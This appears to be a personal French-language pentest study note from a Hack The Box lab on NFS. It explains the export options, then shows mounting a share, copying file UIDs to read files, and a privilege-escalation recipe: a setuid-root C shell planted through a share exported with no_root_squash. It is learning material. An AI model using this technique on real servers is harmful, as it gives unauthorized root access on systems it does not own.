Network File System
Unix/Linux
UDP ou TCP 2049 (depuis v4)
Authorization et authentification sur ONC-OPC, TCP et UDP 111 qui utilise XDR pour échange de données indépendant du système
Utilise Unix UID et GID, n'a pas besoin de correspondre

Config dans /etc/exports

| Option | 		Description |
| --- | --- |
| rw *		|		Read and write permissions.|
| ro 		|		Read only permissions.|
| sync 	|		Synchronous data transfer. (A bit slower)|
| async 	|		Asynchronous data transfer. (A bit faster)|
| secure 	|	Ports above 1024 will not be used.|
| insecure *	|	Ports above 1024 will be used. |
| no_subtree_check | 	This option disables the checking of subdirectory trees. |
| root_squash  |	Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents root from accessing files on an NFS mount.|
| no_root_squash * | All files created by root are kept with the UID/GID 0.|
| nohide * | If another file system was mounted below an exported directory, this directory is exported by its own exports entry.|

ex de config: exposé pour une plage limité
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

## Monter un partage NFS

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Corsaire@htb[/htb]$ showmount -e 10.129.228.163

Export list for 10.129.14.128:
/mnt/nfs 10.129.14.0/24
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

	(L'ip ou plage d'IP est ceux qui ont droit)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$ sudo mount -t nfs 10.129.202.41:/ -m nfs -o nolock
$ cd nfs
$ tree .

.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files

sudo umount ./nfs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


## Accéder à tous les fichiers (sauf root squash)
Lister les noms, UIDs et GUIDs

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ls -l mnt/nfs/
ls -n mnt/nfs/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Recréer les mêmes UIDs

## PRIVESC
Avec no root squash et write on peut créer un exec avec setuid root sur notre PC et l'envoyer sur la victime

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
└─$ cat > shell.c<<EOF
#include <unistd.h>
int main(){
  setuid(0);
  setgid(0);
  system("/bin/bash");
}
EOF

sudo gcc -static shell.c -o shell
sudo chmod u+s shell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

